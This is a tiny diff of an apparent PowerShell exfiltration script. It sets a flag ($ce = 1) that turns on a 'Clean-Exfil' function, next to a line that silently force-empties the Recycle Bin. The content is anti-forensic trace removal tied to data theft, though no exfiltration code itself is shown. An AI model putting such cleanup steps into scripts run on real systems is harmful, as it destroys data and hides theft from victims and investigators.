@@ -52,5 +52,5 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 # le truc de fin
-$ce = 
+$ce = 1
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
